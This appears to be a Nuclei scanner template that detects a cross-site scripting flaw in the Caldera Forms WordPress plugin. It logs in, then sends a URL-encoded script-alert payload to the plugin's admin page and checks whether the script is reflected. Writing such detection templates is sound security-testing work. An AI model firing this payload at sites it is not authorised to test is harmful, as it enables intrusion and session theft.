flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_all(body, "caldera-forms", "form_id_field", "<script>alert(document.domain)</script>")
    type: dsl
  raw:
  - 'GET /wp-admin/admin.php?page=caldera-forms&edit=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-caldera-forms-xss
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:calderaf:caldera_forms:*:*:*:*:*:wordpress:*:*
    cwe-id: CWE-79
  description: 'The Caldera Forms WordPress plugin before 1.5.4 is affected by an
    cross-site scripting (XSS) vulnerability. Due to insufficient input sanitization
    and output escaping, attackers can inject arbitrary JavaScript via form submissions,
    which is then executed for users viewing entries or confirmations.

    '
  impact: 'Attackers can inject malicious scripts into forms, potentially leading
    to session hijacking or theft of sensitive information when users (including admins)
    view injected entries.

    '
  metadata:
    max-requests: 1
    public-www: /wp-content/plugins/caldera-forms/
    verified: true
  name: Caldera Forms <= 1.5.4 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/c70219da-eab2-4d0b-ac5a-77f6d565ef31
  - https://wordpress.org/plugins/caldera-forms
  remediation: 'Update the Caldera Forms plugin to version 1.5.5 or later.

    '
  severity: medium
  tags: wordpress,wp,wp-plugin,caldera-forms,xss,vuln,wpscan
